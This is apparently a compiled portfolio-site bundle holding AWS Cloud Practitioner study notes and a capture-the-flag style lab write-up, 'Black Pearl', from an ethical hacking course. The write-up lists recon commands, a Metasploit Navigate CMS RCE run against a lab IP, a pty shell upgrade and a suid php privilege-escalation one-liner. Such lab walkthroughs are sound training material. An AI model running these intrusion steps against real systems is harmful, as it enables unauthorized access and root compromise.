<p><strong>Amazon Database Migeration Service (DMS)</strong></p>
<p>Migrates existing databse onto AWS in a secure fashion</p>
<p><strong>Amazon DocumentDB</strong></p>
<p>It\u2019s a document Database</p>
<p><strong>Amazon Neptune</strong></p>
<p>Used for Graph Databases</p>
<p><strong>Amazon Quantum Ledger Database (QLDB)</strong></p>
<p>All entries can never be deleted / removed from the audit</p>
<p><strong>Amazon ElasticCache</strong></p>
<p>Provides caching layers for DBS. Supports redis and memcached.</p>
<p><strong>Amazon DynamoDB Accelerator (DAX)</strong></p>
<p><strong>Imporoves read times for non-relational data</strong></p>
<hr>
<h3 id="the-cloud-journey">The Cloud Journey</h3>
<p>AWS Well-Architected Framework: helps you understand how to design and operate reliable, secure, efficient and cost effective systems in the AWS cloud.</p>
<p>Operatoinal Experience</p>
<ul>
<li>Is the ability to run and monitor systems to deliver business value and to continually improve supporting processes and procedures.</li>
</ul>
<p>Security</p>
<ul>
<li>The security pillar is the ability to protect information, systems and assets while delivering business value through risks assessments and mitigation strategies.</li>
</ul>
<p>Reliability</p>
<ul>
<li>
<p>the ability of a system to do the following</p>
</li>
<li>
<p>Recover from infrastructure or service desruption</p>
</li>
<li>
<p>Dynamically acquire computing resources to meet demand</p>
</li>
<li>
<p>Mitigate disruptions such as misconfigurations or transient network issues.</p>
</li>
</ul>
<p>Performance Efficiency</p>
<ul>
<li>the ability to use computing resources efficiently to meet system requiremtns and to maintain that efficiency as demand changes and technology evolves.</li>
</ul>
<p>Cost Optimization</p>
<ul>
<li>Is the ability to run systems to deliver business value at the lowest price point.</li>
</ul>
<p><strong>Benefits of the cloud</strong></p>
<p><mark>There are 6 main benefits of the cloud</mark></p>
<ol>
<li>Trade upfront expenses for variable expense</li>
<li>Benefit from massive economies of scale</li>
<li>Stop guessing capacity</li>
<li>Increase speed and agility</li>
<li>Stop spending money running and maintaining data centers</li>
<li>Go global in minutes</li>
</ol>
<h3 id="aws-well-architected-and-the-six-pillars">AWS Well-Architected and the Six Pillars</h3>
<p><strong>Framework Overview</strong></p>
<p>The AWS Well-Architected Framework describes key concepts, design principles, and architectural best practices for designing and running workloads in the cloud. By answering a few foundational questions, learn how well your architecture aligns with cloud best practices and gain guidance for making improvements.</p>
<p><strong>Operational Excellence Pillar</strong></p>
<p>The operational excellence pillar focuses on running and monitoring systems, and continually improving processes and procedures. Key topics include automating changes, responding to events, and defining standards to manage daily operations.</p>
<ul>
<li>Perfom Operations as code</li>
<li>Make frequent,small reversible changes</li>
<li>Refine operations procedures frequently</li>
<li>Anticipate failure</li>
<li>Learn from all operational failures</li>
</ul>
<p><strong>Performance Efficiency Pillar</strong></p>
<p>The performance efficiency pillar focuses on structured and streamlined allocation of IT and computing resources. Key topics include selecting resource types and sizes optimized for workload requirements, monitoring performance, and maintaining efficiency as business needs evolve.</p>
<ul>
<li>Go global in minutes</li>
<li>Use serverless architechures</li>
<li>Experiment more often</li>
<li>Democratize advanced technologies</li>
</ul>
<p><strong>Security Pillar</strong></p>
<p>The security pillar focuses on protecting information and systems. Key topics include confidentiality and integrity of data, managing user permissions, and establishing controls to detect security events.</p>
<ul>
<li>Enable traceability</li>
<li>Implement a strong indentity foundation</li>
<li>Apply security at all layers</li>
<li>Automate security best practices</li>
<li>Keep people away from data</li>
<li>Prepare for security events</li>
<li>Protect data at rest and in transit</li>
</ul>
<p><strong>Reliability Pillar</strong></p>
<p>The reliability pillar focuses on workloads performing their intended functions and how to recover quickly from failure to meet demands. Key topics include distributed system design, recovery planning, and adapting to changing requirements.</p>
<ul>
<li>Automatically recover from failure</li>
<li>Test recovery procedures</li>
<li>Scale horizontally to increase aggregated workload</li>
<li>Stop guessing capacity</li>
<li>Manage change in automation</li>
</ul>
<p><strong>Cost Optimization Pillar</strong></p>
<p>The cost optimization pillar focuses on avoiding unnecessary costs. Key topics include understanding spending over time and controlling fund allocation, selecting resources of the right type and quantity, and scaling to meet business needs without overspending.</p>
<ul>
<li>Implement Cloud Financial Management</li>
<li>Adopt a consumption model</li>
<li>Measure overall efficiency</li>
<li>Stop spending money on undifferentiated heavy lifting</li>
<li>Analyze and attribute expenditure</li>
</ul>
<p><strong>Sustainability Pillar</strong></p>
<p>The sustainability pillar focuses on minimizing the environmental impacts of running cloud workloads. Key topics include a shared responsibility model for sustainability, understanding impact, and maximizing utilization to minimize required resources and reduce downstream impacts.</p>
<hr>
<h3 id="about-the-exams">About the Exams</h3>
<p>Cloud Concepts - 26%</p>
<p>Security and Compliance - 25%</p>
<p>Technology - 33%</p>
<p>Billing and Pricing - 16%</p>
<p><strong><span style="color:red">65 questions | 90 minutes | 70% passing score | 50 Scoring questions</span></strong></p>
<p><mark>No penalty for quessing</mark></p>
<h3 id="things-you-need-to-know">Things you need to know</h3>
<h4 id="set-1">Set 1</h4>
<p>Know the details of the following (not an exhaustive list):</p>
<ul>
<li>Fundamentals of AWS: IAM, S3, EC2, EBS, EFS, Redshift, RDS, DynamoDB, Auto Scaling</li>
</ul>
<p>Dynamo DB is serverless for NoSQL, IAM is used to manage identity and access control, S3 is a storage service, EC2 is a compute service, EBS is a block storage that can be attached to EC2 instances, EFS is serverless shared storage, Redshift is for data wearhousing, RDS is used to launch or migrate an existing relational database to AWS.</p>
<ul>
<li>VPN, VPC, Transit Gateway, Internet Gateway, NAT Gateway</li>
</ul>
<p>VPC: A web service for provisioning a logically isolated section of the AWS Cloud virtual network that you define. You control your virtual networking environment by selecting your own IP address range, creating\xA0<a href="https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#subnet">subnets</a>\xA0and configuring\xA0<a href="https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#routetable">route tables</a>\xA0and network gateways.</p>
<ul>
<li>Transit Gateway: on-prem and aws cloud connecct to a single gateway(one big cloud router)</li>
<li>Internet Gateway: allows instances with public IPs to access the internet.</li>
<li>NAT Gateway: allows instances with no public IPs to access the internet.</li>
</ul>
<p><strong>CloudFront, CloudFormation, CloudTrail, CloudWatch</strong></p>
<p>CloudFront: An AWS content delivery service that helps you improve the performance, reliability, and availability of your websites and applications.</p>
<p>CloudFormation: A service for writing or changing templates that create and delete related AWS\xA0<a href="https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#resource">resources</a>\xA0together as a unit.</p>
<p>CloudTrail: A web service that records AWS API calls for your account and delivers log files to you</p>
<p>CloudWatch: A web service that you can use to monitor and manage various metrics, and configure alarm actions based on data from those metrics.</p>
<p><strong>AWS Security best practices such as IAM policies and KMS</strong></p>
<p>KMS: A managed service that simplifies the creation and control of\xA0<a href="https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#encrypt">encryption</a>\xA0keys that are used to encrypt data.</p>
<p>What are Region and Availability Zone (AZ) restrictions for different AWS services: Single AZ, Multi-AZ, Single Region, Multi-Region</p>
<p>Availability Zone: A distinct location within a\xA0<a href="https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#region">Region</a>\xA0that\u2019s insulated from failures in other Availability Zones, and provides inexpensive, low-latency network connectivity to other Availability Zones in the same Region.</p>
<p><strong>Region: physical location</strong></p>
<ul>
<li>What AWS services are global:</li>
</ul>
<p>IAM, CloudFront, Amazon Route 53, WAF, Amazon Chime, DynamoDB, WorkDocs, WorkMail, WorkSpaces, WorkLink, Service Certificates</p>
<ul>
<li>What AWS services are truly free:</li>
</ul>
<p>Security Groups, Auto Scaling, CloudFormation</p>
<ul>
<li>What AWS services include a free tier for 12 months for new AWS customers:</li>
</ul>
<p>EC2, S3, RDS, CloudFront, DynamoDB*, Glacier*, Lambda* *Does not automatically expire after 12 months</p>
<ul>
<li>What AWS services are never free (need to pay to use)</li>
</ul>
<p>WIREE, WAF, Inspector, Route 53, EBS volumes, ELB</p>
<ul>
<li>What AWS services are serverless</li>
</ul>
<p>DynamoDB, Aurora, S3, SNS, SQS, Lambda, Fargate</p>
<ul>
<li>What AWS services scale automatically without intervention:</li>
</ul>
<p>S3, Lambda</p>
<ul>
<li>Which data storage options have auto-backup:</li>
</ul>
<p>REEDS \u2014 RDS, EFS, EBS, DynamoDB, Storage Gateway</p>
<hr>
<h4 id="set-2">Set 2</h4>
<ul>
<li>
<p>What is a more cost effective option S3 One-Zone IA or Glacier?</p>
</li>
<li>
<p>When do you use a dedicated host versus a dedicated instance?</p>
</li>
</ul>
<p><mark>Dedicated Instances - You pay for the instances, but they get placed on whatever dedicated hardware Amazon decides.</mark></p>
<p><mark>Dedicated Host - You pay for the entire physical server and can, in effect, run instances on it as you please.</mark></p>
<ul>
<li>Is it more cost effective to run a spot instance or an on-demand instance when requests cannot be interrupted?</li>
<li>When should you use Dynamo DAX versus ElastiCache versus Aurora?</li>
<li>What services can I use to budget my services before I incur costs and how can I set up alerting?</li>
<li>How can I show that RDS is set up for availability? What about for elasticity?</li>
<li>What is the difference between CloudWatch and CloudFront?</li>
<li>What can I use for encryption?</li>
<li>What do I manage and what does AWS manage?</li>
<li>What are the inherited factors from AWS?</li>
<li>When it comes to RDS and EC2, who manages what?</li>
<li>Which services are global?</li>
<li>Which services are on-prem?</li>
<li>Which services are regional?</li>
<li>Which services are reserved?</li>
<li>How much data does it take to use snowball vs snowmobile service?\u201D</li>
<li>What is scaling up vs. scaling out for RDS and EC2?</li>
<li>When/how do you get a TAM?</li>
<li>What do you get full access to Trusted Advisor?</li>
<li>Which services are serverless?</li>
</ul>
<p><strong>AWS Trusted Advisor</strong>\xA0- AWS Trusted Advisors provides recommendations that help you follow AWS best practices. Trusted Advisor evaluates your account by using checks. These checks identify ways to optimize your AWS infrastructure, improve security and performance, reduce costs, and monitor service quotas. You can then follow the check recommendations to optimize your services and resources.</p>
<p>Trusted Advisor can help you save cost, such as recommending you to delete unused or idle resources, or use reserved capacity.</p>
<p><strong>Amazon CloudWatch</strong>\xA0- Amazon CloudWatch is a monitoring service and provides you with data and actionable insights to monitor your applications, respond to system-wide performance changes, and optimize resource utilization. CloudWatch collects monitoring and operational data in the form of logs, metrics, and events. You get a unified view of operational health and gain complete visibility of your AWS resources, applications, and services running on AWS and on-premises. You can use CloudWatch to detect anomalous behavior in your environments, set alarms, visualize logs and metrics side by side, take automated actions, troubleshoot issues, and discover insights to keep your applications running smoothly.</p>
<p><strong>AWS Cost Explorer</strong>\xA0- AWS Cost Explorer has an easy-to-use interface that helps you visualize, understand, and manage your AWS costs and usage over a daily or monthly granularity. It has a default report that helps you visualize the costs and usage associated with your top five cost-accruing AWS services, and gives you a detailed breakdown of all services in the table view. The reports let you adjust the time range to view historical data going back up to twelve months to gain an understanding of your cost trends. It also lets you dive deeper using granular filtering and grouping dimensions such as Usage Type and Tags.</p>
<p><strong>Amazon Inspector</strong>\xA0- Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS. Amazon Inspector automatically assesses applications for exposure, vulnerabilities, and deviations from best practices. After performing an assessment, Amazon Inspector produces a detailed list of security findings prioritized by level of severity. These findings can be reviewed directly or as part of detailed assessment reports, which are available via the Amazon Inspector console or API.</p>
<p><strong>AWS Service Health Dashboard</strong>\xA0- AWS publishes the most up-to-the-minute information on service availability in the Service Health Dashboard. You can visit any time to get the current status and availability information for each individual service. AWS Service Health Dashboard is available at this link:\xA0<a href="https://status.aws.amazon.com/">https://status.aws.amazon.com</a></p>
<p><strong>AWS Personal Health Dashboard</strong>\xA0- The Personal Health Dashboard gives you a personalized view of the status of AWS services that power your applications. Use the Personal Health Dashboard to learn about specific operational issues that affect your account. For example, if you receive an event for a lost Amazon Elastic Block Store (EBS) volume associated with one of your Amazon EC2 instances, you can use the event to quickly view the status of your impacted resources, and then troubleshoot and determine remediation steps.</p>
<p><strong>AWS Config</strong>\xA0- AWS Config enables you to assess, audit, and evaluate the configurations of your AWS resources. Config continuously monitors and records your AWS resource configurations and allows you to automate the evaluation of recorded configurations against desired configurations. With Config, you can review changes in configurations and relationships between AWS resources, dive into detailed resource configuration histories, and determine your overall compliance against the configurations specified in your internal guidelines.</p>
<p><strong>AWS CloudFormation</strong>\xA0- AWS CloudFormation gives you an easy way to model a collection of related AWS and third-party resources, provision them quickly and consistently, and manage them throughout their lifecycles, by treating infrastructure as code. A CloudFormation template describes your desired resources and their dependencies so you can launch and configure them together as a stack. You can use a template to create, update, and delete an entire stack as a single unit, as often as you need to, instead of managing resources individually. You can manage and provision stacks across multiple AWS accounts and AWS Regions.</p>
<p><strong>AWS CloudTrail</strong>\xA0- AWS CloudTrail monitors and records account activity across your AWS infrastructure, giving you control over storage, analysis, and remediation actions. With CloudTrail, you can log, continuously monitor, and retain account activity related to actions across your AWS infrastructure.</p>
<p>CloudTrail provides event history of your AWS Accounts. CloudTrail Events help you answer the questions of \u201Cwho did what, where, and when?\u201C.\xA0 Let\u2019s say your S3 bucket was deleted by mistake. You can use AWS CloudTrail to see who deleted the bucket, when, and where (e.g. API Call or from the AWS Management console).</p>
<p><strong>AWS Elastic Load Balancing</strong>\xA0- Elastic Load Balancing (ELB) is an AWS service that automatically distributes incoming application traffic across multiple targets, such as Amazon EC2 instances, containers, IP addresses, and Lambda functions, and ensures only healthy targets receive traffic. It can handle the varying load of your application traffic in a single Availability Zone or across multiple AZs, and supports the ability to load balance across AWS and on-premises resources in the same load balancer.</p>`),mo={title:"AWS CPP",publishDate:"2023-02-20T00:00:00.000Z",img:"https://res.cloudinary.com/drup8mw79/image/upload/v1676924371/darthassan/posts/aws_i2isgr.jpg",img_alt:"AWS CPP Badge",description:`This write-up is a note for the AWS Certified Cloud Practitioner Certification
`,tags:["AWS","Certification"]},ho="/Users/darth/Desktop/portfolio-website/src/content/work/aws-cpp.md",fo=void 0;go[Symbol.for("astro.needsHeadRendering")]=!0});var vo={};$(vo,{default:()=>vl});async function fl(){return Promise.resolve().then(()=>(yo(),Do))}var gl,Dl,yl,vl,Ao=F(()=>{gl="@@ASTRO-LINKS@@",Dl="@@ASTRO-STYLES@@",yl="@@ASTRO-SCRIPTS@@",vl={__astroPropagation:!0,getMod:fl,collectedLinks:gl,collectedStyles:Dl,collectedScripts:yl}});var Eo={};$(Eo,{Content:()=>Co,compiledContent:()=>wl,default:()=>Co,file:()=>xo,frontmatter:()=>wo,getHeadings:()=>xl,images:()=>cn,rawContent:()=>bl,url:()=>So});function Al(e){return e.replaceAll(/__ASTRO_IMAGE_="([^"]+)"/gm,(n,a)=>ve({src:cn[a].src,...cn[a].attributes}))}function bl(){return`
### Nmap scan

\`\`\`zsh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

### Directory Busting with ffuf

\`\`\`zsh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.82.145/FUZZ
\`\`\`

### DNS recon

\`\`\`zsh
\u250C\u2500\u2500(kali\u327Fkali)-[~]
\u2514\u2500$ dnsrecon -r 127.0.0.0/24 -n 192.168.82.145 -d i
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found


\u250C\u2500\u2500(kali\u327Fkali)-[~]
\u2514\u2500$ sudo nano /etc/hosts

\`\`\`

##### Directory Busting with ffuf

###### http://blackpearl.tcm

\`\`\`
\u250C\u2500\u2500(kali\u327Fkali)-[~]
\u2514\u2500$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
\`\`\`

#### Metasploit

\`\`\`
msf > use exploit/multi/http/navigate_cms_rce
msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 192.168.82.145
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > exploit
\`\`\`

- _Get tty_
  \`python -c 'import pty; pty.spawn("/bin/bash")'\`

#### Previlege Excalation

- Linpeas

\`\`\`
\u250C\u2500\u2500(kali\u327Fkali)-[~/transfers]
\u2514\u2500$ ls
linpeas.sh  pspy64  winpeas.exe  Wise.exe

\u250C\u2500\u2500(kali\u327Fkali)-[~/transfers]
\u2514\u2500$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.82.145 - - [07/Sep/2022 00:57:49] "GET /linpeas.sh HTTP/1.1" 200 -

\`\`\`

- Exploiting suid and sgid using [gtfobins](https://gtfobins.github.io/gtfobins/php/) for php vulnerability
  \`/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"\`

\`\`
`}function wl(){return bo}function xl(){return[{depth:3,slug:"nmap-scan",text:"Nmap scan"},{depth:3,slug:"directory-busting-with-ffuf",text:"Directory Busting with ffuf"},{depth:3,slug:"dns-recon",text:"DNS recon"},{depth:5,slug:"directory-busting-with-ffuf-1",text:"Directory Busting with ffuf"},{depth:6,slug:"httpblackpearltcm",text:"http://blackpearl.tcm"},{depth:4,slug:"metasploit",text:"Metasploit"},{depth:4,slug:"previlege-excalation",text:"Previlege Excalation"}]}async function Co(){let{layout:e,...n}=wo;return n.file=xo,n.url=So,Ke(qe,{"set:html":bo})}var bu,xu,cn,bo,wo,xo,So,Fo=F(()=>{O();bu=S(N(),1);U();xu=S(G(),1);q();K();cn={};bo=Al(`<h3 id="nmap-scan">Nmap scan</h3>
<pre is:raw="" class="astro-code github-dark" style="background-color: #24292e; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color: #B392F0">PORT</span><span style="color: #E1E4E8">   </span><span style="color: #9ECBFF">STATE</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">SERVICE</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">VERSION</span></span>
<span class="line"><span style="color: #B392F0">22/tcp</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">open</span><span style="color: #E1E4E8">  </span><span style="color: #9ECBFF">ssh</span><span style="color: #E1E4E8">     </span><span style="color: #9ECBFF">OpenSSH</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">7.9</span><span style="color: #9ECBFF">p1</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">Debian</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">10</span><span style="color: #9ECBFF">+deb10u2</span><span style="color: #E1E4E8"> (protocol </span><span style="color: #79B8FF">2.0</span><span style="color: #E1E4E8">)</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">ssh-hostkey:</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #E1E4E8">   </span><span style="color: #B392F0">2048</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">66</span><span style="color: #9ECBFF">:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f</span><span style="color: #E1E4E8"> (RSA)</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #E1E4E8">   </span><span style="color: #B392F0">256</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6</span><span style="color: #E1E4E8"> (ECDSA)</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #B392F0">_</span><span style="color: #E1E4E8">  </span><span style="color: #79B8FF">256</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">89</span><span style="color: #9ECBFF">:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d</span><span style="color: #E1E4E8"> (ED25519)</span></span>
<span class="line"><span style="color: #B392F0">53/tcp</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">open</span><span style="color: #E1E4E8">  </span><span style="color: #9ECBFF">domain</span><span style="color: #E1E4E8">  </span><span style="color: #9ECBFF">ISC</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">BIND</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">9.11</span><span style="color: #9ECBFF">.5-P4-5.1+deb10u5</span><span style="color: #E1E4E8"> (Debian </span><span style="color: #9ECBFF">Linux</span><span style="color: #E1E4E8">)</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">dns-nsid:</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #B392F0">_</span><span style="color: #E1E4E8">  </span><span style="color: #9ECBFF">bind.version:</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">9.11</span><span style="color: #9ECBFF">.5-P4-5.1+deb10u5-Debian</span></span>
<span class="line"><span style="color: #B392F0">80/tcp</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">open</span><span style="color: #E1E4E8">  </span><span style="color: #9ECBFF">http</span><span style="color: #E1E4E8">    </span><span style="color: #9ECBFF">nginx</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">1.14</span><span style="color: #9ECBFF">.2</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #B392F0">_http-title:</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">Welcome</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">to</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">nginx!</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #E1E4E8"> </span><span style="color: #B392F0">http-methods:</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #B392F0">_</span><span style="color: #E1E4E8">  </span><span style="color: #9ECBFF">Supported</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">Methods:</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">GET</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">HEAD</span></span>
<span class="line"><span style="color: #F97583">|</span><span style="color: #B392F0">_http-server-header:</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">nginx/1.14.2</span></span>
<span class="line"><span style="color: #B392F0">Service</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">Info:</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">OS:</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">Linux</span><span style="color: #E1E4E8">; </span><span style="color: #B392F0">CPE:</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">cpe:/o:linux:linux_kernel</span></span></code></pre>
<h3 id="directory-busting-with-ffuf">Directory Busting with ffuf</h3>
<pre is:raw="" class="astro-code github-dark" style="background-color: #24292e; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color: #B392F0">ffuf</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">-w</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">-u</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">http://192.168.82.145/FUZZ</span></span></code></pre>
<h3 id="dns-recon">DNS recon</h3>
<pre is:raw="" class="astro-code github-dark" style="background-color: #24292e; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color: #B392F0">\u250C\u2500\u2500(kali\u327Fkali</span><span style="color: #E1E4E8">)-[~]</span></span>
<span class="line"><span style="color: #B392F0">\u2514\u2500$</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">dnsrecon</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">-r</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">127.0</span><span style="color: #9ECBFF">.0.0/24</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">-n</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">192.168</span><span style="color: #9ECBFF">.82.145</span><span style="color: #E1E4E8"> </span><span style="color: #79B8FF">-d</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">i</span></span>
<span class="line"><span style="color: #E1E4E8">[</span><span style="color: #F97583">*</span><span style="color: #E1E4E8">] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255</span></span>
<span class="line"><span style="color: #E1E4E8">[+]      PTR blackpearl.tcm 127.0.0.1</span></span>
<span class="line"><span style="color: #E1E4E8">[+] 1 Records Found</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color: #B392F0">\u250C\u2500\u2500(kali\u327Fkali</span><span style="color: #E1E4E8">)-[~]</span></span>
<span class="line"><span style="color: #B392F0">\u2514\u2500$</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">sudo</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">nano</span><span style="color: #E1E4E8"> </span><span style="color: #9ECBFF">/etc/hosts</span></span>
<span class="line"></span></code></pre>
<h5 id="directory-busting-with-ffuf-1">Directory Busting with ffuf</h5>
<h6 id="httpblackpearltcm"><a href="http://blackpearl.tcm">http://blackpearl.tcm</a></h6>
<pre is:raw="" class="astro-code github-dark" style="background-color: #24292e; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color: #e1e4e8">\u250C\u2500\u2500(kali\u327Fkali)-[~]</span></span>
<span class="line"><span style="color: #e1e4e8">\u2514\u2500$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ</span></span></code></pre>
<h4 id="metasploit">Metasploit</h4>
<pre is:raw="" class="astro-code github-dark" style="background-color: #24292e; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color: #e1e4e8">msf > use exploit/multi/http/navigate_cms_rce</span></span>
<span class="line"><span style="color: #e1e4e8">msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 192.168.82.145</span></span>
<span class="line"><span style="color: #e1e4e8">msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm</span></span>
<span class="line"><span style="color: #e1e4e8">msf6 exploit(multi/http/navigate_cms_rce) > exploit</span></span></code></pre>
<ul>
<li><em>Get tty</em>
<code>python -c 'import pty; pty.spawn("/bin/bash")'</code></li>
</ul>
<h4 id="previlege-excalation">Previlege Excalation</h4>
<ul>
<li>Linpeas</li>
</ul>
<pre is:raw="" class="astro-code github-dark" style="background-color: #24292e; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color: #e1e4e8">\u250C\u2500\u2500(kali\u327Fkali)-[~/transfers]</span></span>
<span class="line"><span style="color: #e1e4e8">\u2514\u2500$ ls</span></span>
<span class="line"><span style="color: #e1e4e8">linpeas.sh  pspy64  winpeas.exe  Wise.exe</span></span>
<span class="line"><span style="color: #e1e4e8"></span></span>
<span class="line"><span style="color: #e1e4e8">\u250C\u2500\u2500(kali\u327Fkali)-[~/transfers]</span></span>
<span class="line"><span style="color: #e1e4e8">\u2514\u2500$ python3 -m http.server 80</span></span>
<span class="line"><span style="color: #e1e4e8">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></span>
<span class="line"><span style="color: #e1e4e8">192.168.82.145 - - [07/Sep/2022 00:57:49] "GET /linpeas.sh HTTP/1.1" 200 -</span></span>
<span class="line"><span style="color: #e1e4e8"></span></span></code></pre>
<ul>
<li>Exploiting suid and sgid using <a href="https://gtfobins.github.io/gtfobins/php/">gtfobins</a> for php vulnerability
<code>/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"</code></li>
</ul>
<p>\u201C</p>`),wo={title:"Black Pearl",publishDate:"2023-02-19T00:00:00.000Z",img:"https://res.cloudinary.com/drup8mw79/image/upload/v1676852363/darthassan/posts/urvan-taillebuis-blackpearl-03_etysfo.jpg",img_alt:"The black pearl pirate ship",description:`The Black Pearl is a capstone project for TCM's Practical Ethical Hacking course.
`,tags:["PEH","Metasploit","Previlege Excalation"]},xo="/Users/darth/Desktop/portfolio-website/src/content/work/peh/blackpearl.md",So=void 0;Co[Symbol.for("astro.needsHeadRendering")]=!0});var ko={};$(ko,{default:()=>kl});async function Sl(){return Promise.resolve().then(()=>(Fo(),Eo))}var Cl,El,Fl,kl,Bo=F(()=>{Cl="@@ASTRO-LINKS@@",El="@@ASTRO-STYLES@@",Fl="@@ASTRO-SCRIPTS@@",kl={__astroPropagation:!0,getMod:Sl,collectedLinks:Cl,collectedStyles:El,collectedScripts:Fl}});var Mo={};$(Mo,{$:()=>ie,_:()=>Hl,g:()=>Pe});function Pl(e){return async(n,a)=>{let t=To[n]?.entries[a];if(t)return e[n][t]}}async function jl(){return(await Pe("work")).map(n=>({params:{slug:n.slug},props:{entry:n}}))}var 